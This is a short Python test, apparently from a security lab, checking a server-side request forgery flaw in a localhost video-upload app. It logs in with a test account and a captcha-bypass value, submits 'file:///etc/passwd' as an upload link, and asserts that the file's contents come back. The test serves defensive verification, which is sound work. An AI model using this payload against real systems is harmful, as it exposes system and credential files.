import requests

#server side request forgery
def test_1_ssrf():
	params = {'username':'new', 'password':'new', 'recap':'L33THAx0rTest'}
	page = requests.get('https://localhost/python/SignIn.py', params=params, verify=False)
	page.encoding = 'utf-8'
	cookiename = page.text.strip().split(';')[0].split('=')[0]
	cookievalue = page.text.strip().split(';')[0].split('=')[1]
	cookies = {cookiename: cookievalue}
	params = {'fileinlink':'file:///etc/passwd', 'videoname':'brah', 'filein':' '}
	page = requests.get('https://localhost/python/UpVid.py', params=params, cookies=cookies, verify=False)
	page = requests.get('https://localhost/videos/new_passwords', cookies=cookies, verify=False)
	assert 'rooty root root' in page.text
